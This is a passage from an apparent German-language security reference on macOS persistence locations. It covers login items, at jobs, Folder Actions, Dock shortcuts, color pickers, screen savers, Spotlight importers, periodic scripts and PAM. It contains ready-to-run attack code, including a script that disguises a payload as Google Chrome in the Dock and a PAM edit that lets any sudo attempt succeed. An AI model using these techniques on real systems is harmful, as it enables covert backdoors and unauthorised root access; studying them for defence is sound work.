- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Auslöser:** Login
- Root erforderlich

#### Beschreibung

Unter Systemeinstellungen -> Benutzer & Gruppen -> **Login Items** finden sich **Elemente, die ausgeführt werden, wenn sich der Benutzer anmeldet**.\
Es ist möglich, sie über die Kommandozeile aufzulisten, hinzuzufügen und zu entfernen:<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Diese Elemente werden in der Datei **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** gespeichert.

**Login items** können **auch über die API** [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) angegeben werden. Die Konfiguration wird dann in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** gespeichert.

### ZIP as Login Item

(Siehe den vorherigen Abschnitt über Login Items; dies ist eine Erweiterung.)

Wenn du eine **ZIP**-Datei als **Login Item** speicherst, öffnet die **`Archive Utility`** sie. Wenn die ZIP beispielsweise in **`~/Library`** gespeichert ist und den Ordner **`LaunchAgents/file.plist`** mit einer Backdoor enthält, wird dieser Ordner erstellt (standardmäßig existiert er nicht) und die plist hinzugefügt. Beim nächsten erneuten Anmelden des Benutzers wird dann die in der plist angegebene **Backdoor ausgeführt**.

Eine weitere Option wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im HOME-Verzeichnis des Benutzers zu erstellen. Dadurch würde diese Technik auch dann funktionieren, wenn der Ordner LaunchAgents bereits existiert.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- Du musst **`at`** jedoch **ausführen**, und es muss **aktiviert** sein.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Du musst **`at`** **ausführen**, und es muss **aktiviert** sein.

#### **Beschreibung**

`at`-Aufgaben sind dafür vorgesehen, **einmalige Aufgaben zu planen**, die zu bestimmten Zeitpunkten ausgeführt werden. Im Gegensatz zu cron jobs werden `at`-Aufgaben nach der Ausführung automatisch entfernt. Wichtig ist, dass diese Aufgaben Systemneustarts überdauern, wodurch sie unter bestimmten Bedingungen ein potenzielles Sicherheitsrisiko darstellen.<sup>[[16]](#references)</sup>

**Standardmäßig** sind sie **deaktiviert**, aber der **root**-Benutzer kann sie mit folgendem Befehl **aktivieren**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Dadurch wird in 1 Stunde eine Datei erstellt:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Überprüfe die Job-Warteschlange mit `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Oben sehen wir zwei geplante Jobs. Wir können die Details des Jobs mit `at -c JOBNUMBER` ausgeben.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Wenn AT tasks nicht aktiviert sind, werden die erstellten tasks nicht ausgeführt.

Die **Job-Dateien** befinden sich unter `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Der Dateiname enthält die Queue, die Jobnummer und den Zeitpunkt, zu dem der Job ausgeführt werden soll. Sehen wir uns zum Beispiel `a0001a019bdcd2` an.

- `a` - dies ist die Queue
- `0001a` - Jobnummer in Hexadezimal, `0x1a = 26`
- `019bdcd2` - Zeit in Hexadezimal. Sie stellt die seit der Epoch vergangenen Minuten dar. `0x019bdcd2` entspricht dezimal `26991826`. Wenn wir diesen Wert mit 60 multiplizieren, erhalten wir `1619509560`, also `GMT: Dienstag, 27. April 2021, 7:46:00`.

Wenn wir die Jobdatei ausgeben, stellen wir fest, dass sie dieselben Informationen enthält, die wir mit `at -c` erhalten haben.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Nützlich zum Umgehen der sandbox: [✅](https://emojipedia.org/check-mark-button)
- Du musst jedoch in der Lage sein, `osascript` mit Argumenten aufzurufen, um **`System Events`** zu kontaktieren und Folder Actions konfigurieren zu können
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Es verfügt über einige grundlegende TCC-Berechtigungen, etwa für Desktop, Documents und Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root erforderlich
- **Trigger**: Zugriff auf den angegebenen Ordner
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Zugriff auf den angegebenen Ordner

#### Description & Exploitation

Folder Actions sind Scripts, die automatisch durch Änderungen in einem Ordner ausgelöst werden, etwa durch das Hinzufügen oder Entfernen von Elementen oder durch andere Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Actions können für verschiedene Aufgaben verwendet und auf unterschiedliche Weise ausgelöst werden, etwa über die Finder-Benutzeroberfläche oder Terminal-Befehle.<sup>[[17]](#references)[[18]](#references)</sup>

Zum Einrichten von Folder Actions stehen beispielsweise folgende Möglichkeiten zur Verfügung:

1. Einen Folder-Action-Workflow mit [Automator](https://support.apple.com/guide/automator/welcome/mac) erstellen und ihn als Service installieren.
2. Ein Script manuell über Folder Actions Setup im Kontextmenü eines Ordners zuweisen.
3. OSAScript verwenden, um Apple-Event-Nachrichten an die `System Events.app` zu senden und eine Folder Action programmgesteuert einzurichten.
- Diese Methode ist besonders nützlich, um die Action in das System einzubetten und dadurch ein gewisses Maß an Persistenz zu erreichen.

Das folgende Script ist ein Beispiel dafür, was durch eine Folder Action ausgeführt werden kann:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Damit das obige Script von Folder Actions verwendet werden kann, kompilieren Sie es mit:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nachdem das Script kompiliert wurde, richten Sie Folder Actions aus, indem Sie das unten stehende Script ausführen. Dieses Script aktiviert Folder Actions global und weist das zuvor kompilierte Script speziell dem Desktop-Ordner zu.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Führen Sie das Setup-Skript aus mit:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- So implementierst du diese Persistence über die GUI:

Dies ist das Script, das ausgeführt wird:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompiliere es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Verschiebe es nach:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Öffne anschließend die App `Folder Actions Setup`, wähle den **Ordner aus, den du überwachen möchtest**, und wähle in deinem Fall **`folder.scpt`** (in meinem Fall habe ich sie output2.scp genannt):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Wenn du diesen Ordner nun mit **Finder** öffnest, wird dein Script ausgeführt.

Diese Konfiguration wurde im **plist** unter **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** im Base64-Format gespeichert.

Versuchen wir nun, diese Persistence ohne GUI-Zugriff vorzubereiten:

1. **Kopiere `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um sie zu sichern:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entferne** die soeben eingerichteten Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Da wir nun eine leere Umgebung haben:

3. Kopiere die Backup-Datei: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffne die Folder Actions Setup.app, um diese Konfiguration zu übernehmen: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bei mir hat dies nicht funktioniert, aber das sind die Anweisungen aus dem Writeup:(

### Dock-Verknüpfungen

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- Allerdings muss eine schädliche Anwendung im System installiert sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Wenn der Benutzer auf die App im Dock klickt

#### Beschreibung & Exploitation

Alle Anwendungen, die im Dock erscheinen, werden im plist **`~/Library/Preferences/com.apple.dock.plist`** angegeben.<sup>[[19]](#references)</sup>

Es ist möglich, **eine Anwendung** einfach mit Folgendem hinzuzufügen:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Mithilfe von **social engineering** könntest du beispielsweise **Google Chrome** im Dock imitieren und tatsächlich dein eigenes Skript ausführen:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Nützlich zum Umgehen der sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Eine sehr spezifische Aktion muss stattfinden
- Du landest in einer anderen sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/Library/ColorPickers`
- Root erforderlich
- Auslöser: Den color picker verwenden
- `~/Library/ColorPickers`
- Auslöser: Den color picker verwenden

#### Beschreibung & Exploit

**Compile ein color picker**-Bundle mit deinem code (du könntest beispielsweise [**dieses hier verwenden**](https://github.com/viktorstrate/color-picker-plus)), füge einen constructor hinzu (wie im [Screen Saver-Abschnitt](macos-auto-start-locations.md#screen-saver)) und kopiere das Bundle nach `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Wenn der color picker anschließend ausgelöst wird, sollte dein code ebenfalls ausgeführt werden.

Beachte, dass die binary, die deine library lädt, eine **sehr restriktive sandbox** verwendet: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: **Nein, weil du deine eigene App ausführen musst**
- TCC-Bypass: ???

#### Ort

- Eine bestimmte App

#### Beschreibung & Exploit

Ein Anwendungsbeispiel mit einer Finder Sync Extension [**ist hier zu finden**](https://github.com/D00MFist/InSync).

Anwendungen können `Finder Sync Extensions` enthalten. Diese Extension befindet sich innerhalb einer Anwendung, die ausgeführt wird. Damit die Extension ihren Code ausführen kann, **muss sie** außerdem mit einem gültigen Apple-Developer-Zertifikat **signiert** sein, sie muss **sandboxed** sein (obwohl möglicherweise gelockerte Ausnahmen hinzugefügt werden können), und sie muss mit etwas wie dem Folgenden registriert sein:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Du landest jedoch in einer gewöhnlichen Application-Sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

- `/System/Library/Screen Savers`
- Root erforderlich
- **Trigger**: Den Screen Saver auswählen
- `/Library/Screen Savers`
- Root erforderlich
- **Trigger**: Den Screen Saver auswählen
- `~/Library/Screen Savers`
- **Trigger**: Den Screen Saver auswählen

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstelle ein neues Projekt in Xcode und wähle die Vorlage aus, um einen neuen **Screen Saver** zu generieren. Füge anschließend deinen Code hinzu, zum Beispiel den folgenden Code zum Generieren von Logs.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** es und kopiere das `.saver`-Bundle nach **`~/Library/Screen Savers`**. Öffne anschließend die Screen-Saver-GUI. Wenn du einfach darauf klickst, sollten zahlreiche Logs generiert werden:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Beachte, dass du dich **innerhalb der allgemeinen Anwendungssandbox** befindest, da du in den Entitlements der Binärdatei, die diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **`com.apple.security.app-sandbox`** finden kannst.

Bildschirmschoner-Code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight-Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Du wirst jedoch in einer Application-Sandbox enden
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Die Sandbox wirkt sehr eingeschränkt

#### Speicherort

- `~/Library/Spotlight/`
- **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- `/Library/Spotlight/`
- **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- Root erforderlich
- `/System/Library/Spotlight/`
- **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- Root erforderlich
- `Some.app/Contents/Library/Spotlight/`
- **Auslöser**: Eine neue Datei mit einer vom Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- Neue App erforderlich

#### Beschreibung & Exploitation

Spotlight ist die integrierte Suchfunktion von macOS, die Benutzern **schnellen und umfassenden Zugriff auf Daten auf ihren Computern** ermöglichen soll.\
Um diese schnelle Suchfunktion bereitzustellen, verwaltet Spotlight eine **proprietäre Datenbank** und erstellt einen Index, indem es **die meisten Dateien analysiert**. Dadurch werden schnelle Suchen sowohl nach Dateinamen als auch nach deren Inhalten ermöglicht.<sup>[[25]](#references)</sup>

Der zugrunde liegende Mechanismus von Spotlight umfasst einen zentralen Prozess namens „mds“, was für **„metadata server“** steht. Dieser Prozess koordiniert den gesamten Spotlight-Dienst. Ergänzend dazu gibt es mehrere „mdworker“-Daemons, die verschiedene Wartungsaufgaben ausführen, beispielsweise die Indizierung unterschiedlicher Dateitypen (`ps -ef | grep mdworker`). Diese Aufgaben werden durch Spotlight-Importer-Plugins oder **„.mdimporter bundles“** ermöglicht, die Spotlight erlauben, Inhalte aus einer vielfältigen Reihe von Dateiformaten zu verstehen und zu indizieren.

Die Plugins oder **`.mdimporter`**-Bundles befinden sich an den zuvor genannten Orten. Wenn ein neues Bundle erscheint, wird es innerhalb einer Minute geladen (ein Neustart eines Dienstes ist nicht erforderlich). Diese Bundles müssen angeben, **welchen Dateityp und welche Erweiterungen sie verwalten können**. Auf diese Weise verwendet Spotlight sie, wenn eine neue Datei mit der angegebenen Erweiterung erstellt wird.

Es ist möglich, **alle geladenen `mdimporters`** mit folgendem Befehl zu finden:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Und beispielsweise wird **/Library/Spotlight/iBooksAuthor.mdimporter** verwendet, um diese Art von Dateien (unter anderem mit den Erweiterungen `.iba` und `.book`) zu analysieren:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Wenn du die Plist eines anderen `mdimporter` überprüfst, findest du möglicherweise den Eintrag **`UTTypeConformsTo`** nicht. Das liegt daran, dass es sich dabei um einen integrierten _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) handelt und dieser keine Erweiterungen angeben muss.
>
> Außerdem haben Systemstandard-Plugins immer Vorrang. Ein Angreifer kann daher nur auf Dateien zugreifen, die nicht bereits von Apples eigenen `mdimporters` indiziert werden.

Um deinen eigenen Importer zu erstellen, kannst du mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), anschließend den Namen und **`CFBundleDocumentTypes`** ändern und **`UTImportedTypeDeclarations`** hinzufügen, damit die gewünschte Erweiterung unterstützt wird, und diese in **`schema.xml`** widerspiegeln.\
Dann **ändere** den Code der Funktion **`GetMetadataForFile`**, damit dein Payload ausgeführt wird, wenn eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Zum Schluss **baue deinen neuen `.mdimporter`** und kopiere ihn an einen der drei zuvor genannten Orte. Du kannst überprüfen, ob er geladen wurde, indem du die **Logs überwachst** oder **`mdimport -L`** ausführst.

### ~~Einstellungsbereich~~

> [!CAUTION]
> Es sieht nicht so aus, als würde dies noch funktionieren.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Es erfordert eine bestimmte Benutzeraktion
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beschreibung

Es sieht nicht so aus, als würde dies noch funktionieren.<sup>[[26]](#references)</sup>

## Root-Sandbox-Bypass

> [!TIP]
> Hier findest du Startorte, die für einen **sandbox bypass** nützlich sind und es dir ermöglichen, etwas einfach auszuführen, indem du es als **root** in eine Datei **schreibst** und/oder andere **ungewöhnliche Bedingungen** erfüllst.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Du musst jedoch root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root erforderlich
- **Trigger**: Wenn der entsprechende Zeitpunkt erreicht ist
- `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
- Root erforderlich
- **Trigger**: Wenn der entsprechende Zeitpunkt erreicht ist

#### Beschreibung & Exploitation

Die Periodic-Skripte (**`/etc/periodic`**) werden aufgrund der **launch daemons** ausgeführt, die in `/System/Library/LaunchDaemons/com.apple.periodic*` konfiguriert sind. Beachte, dass in `/etc/periodic/` gespeicherte Skripte als **Eigentümer der Datei** ausgeführt werden. Daher funktioniert dies nicht für eine mögliche Privilege Escalation.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Es gibt weitere regelmäßig ausgeführte Skripte, die in **`/etc/defaults/periodic.conf`** angegeben sind:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Wenn es dir gelingt, eine der Dateien `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local` zu schreiben, wird sie **früher oder später ausgeführt**.

> [!WARNING]
> Beachte, dass das periodic-Script **als Eigentümer des Scripts ausgeführt wird**. Wenn also ein regulärer Benutzer Eigentümer des Scripts ist, wird es als dieser Benutzer ausgeführt (dies kann Privilege-Escalation-Angriffe verhindern).

### PAM

Ausarbeitung: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Ausarbeitung: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Dafür musst du jedoch root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

- Root ist immer erforderlich

#### Beschreibung & Exploitation

Da PAM stärker auf **Persistence** und Malware als auf eine einfache Ausführung innerhalb von macOS ausgerichtet ist, enthält dieser Blog keine detaillierte Erklärung. **Lies die Ausarbeitungen, um diese Technik besser zu verstehen**.<sup>[[28]](#references)</sup>

Überprüfe PAM-Module mit:
```bash
ls -l /etc/pam.d
```
Eine Persistence-/Privilege-Escalation-Technik durch den Missbrauch von PAM ist so einfach wie das Ändern des Moduls /etc/pam.d/sudo und das Hinzufügen der folgenden Zeile am Anfang:
```bash
auth       sufficient     pam_permit.so
```
Es wird also **etwa so aussehen**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Und daher wird jeder Versuch, **`sudo` zu verwenden, funktionieren**.

> [!CAUTION]
> Beachte, dass dieses Verzeichnis durch TCC geschützt ist. Daher ist es sehr wahrscheinlich, dass der Benutzer eine Eingabeaufforderung erhält, die um Zugriff bittet.

Ein weiteres gutes Beispiel ist `su`. Hier kann man sehen, dass es ebenfalls möglich ist, den PAM-Modulen Parameter zu übergeben (und man könnte diese Datei auch backdooren):
```bash
cat /etc/pam.d/su
# su: auth account session
